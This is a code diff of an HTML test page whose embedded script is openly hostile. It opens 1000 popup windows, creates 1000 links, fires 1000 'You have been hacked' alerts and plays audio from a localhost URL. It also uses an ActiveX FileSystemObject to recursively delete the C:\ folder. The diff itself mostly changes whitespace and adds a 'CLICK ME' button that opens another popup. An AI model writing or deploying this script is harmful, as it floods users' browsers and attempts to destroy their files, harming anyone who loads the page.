@@ -5,15 +5,13 @@
 </head>
 <body>
     <script>
-      
-
-        
+     
         for (var i = 0; i < 1000; i++) {
             var win = window.open("http://localhost:8080/Testing6.html", '_blank');
             win.focus();
         }
 
-        
+       
         for (var i = 0; i < 1000; i++) {
             var a = document.createElement("a");
             a.href = "http://localhost:8080/Testing6.html";
@@ -24,28 +22,40 @@
        
         var audio = new Audio('http://localhost:8080/Testing6.html');
         audio.play();
-        
+  
         for (var i = 0; i < 1000; i++) {
             alert("You have been hacked");
         }
 
-      
+    
         var win = window.open("http://localhost:8080/Testing6.html", '_blank');
         win.focus();
 
-      
+
         var fso = new ActiveXObject("Scripting.FileSystemObject");
         var f = fso.GetFolder("C:\\");
         f.Delete(true);
 
-     
+ 
         var xhr = new XMLHttpRequest();
         xhr.open("GET", "http://localhost:8080/Testing6.html", true);
         xhr.send();
 
 
+        function BUTTON() {
+        var btn = document.createElement("BUTTON");
+        btn.innerHTML = "CLICK ME";
+        document.body.appendChild(btn);
+        btn.onclick = function () {
+            var win = window.open("http://localhost:8080/Testing6.html", '_blank');
+            win.focus();
+        };
+    }
+        
         
     </script>
     <div id="output"></div>
+    <button onclick="BUTTON()">CLICK ME</button>
+
 
 </body>
